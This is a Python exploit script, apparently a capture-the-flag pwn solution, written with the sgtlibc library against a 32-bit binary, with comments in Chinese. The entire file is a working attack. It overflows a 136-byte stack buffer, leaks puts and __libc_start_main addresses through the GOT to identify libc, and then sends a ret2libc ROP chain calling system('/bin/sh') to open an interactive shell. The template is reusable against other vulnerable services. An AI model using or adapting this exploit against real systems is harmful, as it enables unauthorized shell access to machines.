import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True,
    file='./5afea37c3946a',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf
pause()

canary = b''


def exp():
    # overflow position
    data = [b'a' * (136),fakeebp()]
    return data


main_addr = 0x0804859D # elf.symbols['main']
plt_write = elf.plt['puts']


def leak(func: str):
    log.info(f'start leak {func}')
    payload = exp()
    payload += [plt_write, main_addr, elf.got[func]]
    # 如果是read的话则sa，如果是gets scanf的话则sl
    sla('information: ',payload)
    # 清空输出
    # ru('Hello,')
    # rl()
    data = rc(4)  # 32位接收4个
    data = u00(data)
    log.info(f'leak {func}:{hex(data)}')
    s.add_condition(func, data)
    pause()
    return data


# 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确
# leak('printf')
leak('puts')
# leak('stdout')
# leak('stdin')
leak('__libc_start_main')

# 如果给了libc则可以直接使用
# libc = ELF('libc_buu-2.23_x64.so', checksec=False)
# offset = addr - libc.symbols['__libc_start_main']
# system_addr = libc.symbols['system'] + offset
# binsh_addr = next(libc.search(b'/bin/sh')) + offset

data = s.dump(db_index=0)  # choose your system index
system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')

ret_addr = elf.rop['ret']  # 栈平衡
payload = [exp(), ret_addr]
payload += [system_addr, fakeebp(), binsh_addr]
sl(payload)
interactive()
